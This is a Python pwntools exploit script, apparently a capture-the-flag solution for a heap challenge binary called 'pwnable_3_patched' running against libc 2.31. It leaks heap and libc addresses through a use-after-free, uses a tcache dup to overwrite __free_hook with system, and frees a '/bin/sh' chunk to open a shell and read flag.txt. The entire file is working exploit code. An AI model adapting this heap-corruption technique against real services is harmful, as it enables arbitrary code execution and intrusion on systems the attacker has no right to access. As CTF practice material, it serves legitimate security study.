#!/usr/bin/env python3
from pwn import *

PORT = 13339
HOST = "127.0.0.1"
elf = context.binary = ELF('./pwnable_3_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            # brva 0x000000000000181B
            brva 0x00000000000015E1
            brva 0x00000000000016B2
            brva 0x0000000000001737
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def add(name, password = b'd1nhdwc'):
    p.sendlineafter(b'> ', str(2).encode())
    p.sendafter(b'> ', name)
    p.sendafter(b'> ', password)

def delete(name):
    p.sendlineafter(b'> ', str(3).encode())
    p.sendafter(b'> ', name)

def change(name, password = b'changed'):
    p.sendlineafter(b'> ', str(4).encode())
    p.sendafter(b'> ', name)
    p.sendafter(b'> ', password)

def view():
    p.sendlineafter(b'> ', str(5))

# Stage 1: Leak heap, libc
## Leak heap

delete(b"root")
view()
p.recvuntil(b': ')
heap_base = (u64(p.recv(6).ljust(8, b'\x00')) >> 12) << 12
log.info(f'heap_base: {hex(heap_base)}')

## Leak libc

root = heap_base+0x370
menu0 = heap_base+0x3a0

change(p64(0), b"A"*8)
delete(p64(0))

change(p64(root), b"B"*8)
delete(p64(root))   # root -> root -> root
# GDB()
add(p64(menu0), b"1"*8)
p.sendlineafter(b'> ', str(1).encode())
p.sendlineafter(b'> ', str(1).encode())

delete(b"root")

fd = p64(0)
for i in range(2, 9):
    change(fd, b"X"*8)
    delete(fd)
    fd = p64(menu0)
# GDB()
view()
libc.address = u64(p.recv(6).ljust(8, b'\x00')) -0x4be0 - 0x1e8000
log.info(f'libc_base: {hex(libc.address)}')

# Stage 2: Tcache Dup ow __free_hook -> system

add(b'C'*8)
add(b'D'*8)

delete(b'C'*8)
delete(b'D'*8)

change(p64(menu0))
delete(p64(menu0))

add(p64(libc.sym.__free_hook))
add(b'dump')

add(p64(libc.sym.system))
# GDB()
add(b'/bin/sh\0')
delete(b'/bin/sh\0')

p.sendline(b'cat flag.txt')
p.interactive()